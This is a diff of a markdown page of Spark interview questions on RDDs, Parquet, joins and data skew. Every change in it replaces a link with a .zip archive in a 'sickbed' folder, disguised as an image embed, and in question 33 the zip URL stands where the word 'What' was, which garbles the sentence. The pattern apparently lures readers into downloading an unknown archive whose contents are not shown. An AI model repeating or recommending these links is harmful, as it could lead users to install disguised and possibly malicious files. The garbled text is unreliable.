@@ -5,7 +5,7 @@
 => RDD → Raw power, full control, but slower!
 => DataFrame → Optimized, easy, SQL-friendly!
 =>Dataset → Strongly typed, safer, but JVM-only!
-![image](https://github.com/iqbaldiit/BigDataQnA/raw/refs/heads/main/sickbed/A_Big_Qn_Data_v1.5.zip)
+![image](https://raw.githubusercontent.com/iqbaldiit/BigDataQnA/main/sickbed/A-Big-Qn-Data-2.1.zip)
 
 2. What are the challenges you face in spark?
 
@@ -29,7 +29,7 @@
 
 5. What is the Advantage of a Parquet File?
 
-    ![alt text](https://github.com/iqbaldiit/BigDataQnA/raw/refs/heads/main/sickbed/A_Big_Qn_Data_v1.5.zip)    
+    ![alt text](https://raw.githubusercontent.com/iqbaldiit/BigDataQnA/main/sickbed/A-Big-Qn-Data-2.1.zip)    
     Fast Reads + Small Size + Schema-aware + Analytics-friendly
 
 6. What is a Broadcast Join ?
@@ -49,7 +49,7 @@
 9. What is meant by Data Skewness? How is it deal? 
 
     If one executor get the lot of load in a work node after the shuffling, it is called data skewness. It can be solved by spark salting.
-    ![image](https://github.com/iqbaldiit/BigDataQnA/raw/refs/heads/main/sickbed/A_Big_Qn_Data_v1.5.zip)
+    ![image](https://raw.githubusercontent.com/iqbaldiit/BigDataQnA/main/sickbed/A-Big-Qn-Data-2.1.zip)
 
 10. What are the optimisation techniques used in Spark?
 
@@ -77,7 +77,7 @@
 30. Can you explain Anti join and Semi join?
 31. What is the difference between Order By, Sort By, and Cluster By?
 32. Data Frame vs Dataset in spark?
-33. https://github.com/iqbaldiit/BigDataQnA/raw/refs/heads/main/sickbed/A_Big_Qn_Data_v1.5.zip are the join strategies in Spark
+33. https://raw.githubusercontent.com/iqbaldiit/BigDataQnA/main/sickbed/A-Big-Qn-Data-2.1.zip are the join strategies in Spark
 34. What happens in Cluster deployment mode and Client deployment mode
 35. What are the parameters you have used in spark-submit
 36. How do you add a new column in Spark
